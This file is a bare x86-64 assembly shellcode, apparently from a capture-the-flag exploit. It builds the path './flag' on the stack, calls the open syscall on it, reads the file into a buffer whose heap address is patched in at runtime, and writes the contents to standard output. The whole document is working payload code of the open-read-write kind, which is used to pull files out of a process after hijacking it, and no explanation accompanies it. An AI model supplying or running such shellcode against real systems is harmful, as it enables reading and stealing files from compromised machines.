global _start

section .text
_start:
	mov rax, 0x000067616c662f2e
	push rax
	push rsp
	push qword 2
	pop rax
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	syscall

	push rax
	xor rax, rax
	pop rdi
	movabs rsi, 0x00 ; dynamically replace it to known heap address
	push 0x100
	pop rdx
	syscall

	push qword 1
	pop rax
	push rax
	pop rdi
	syscall
	

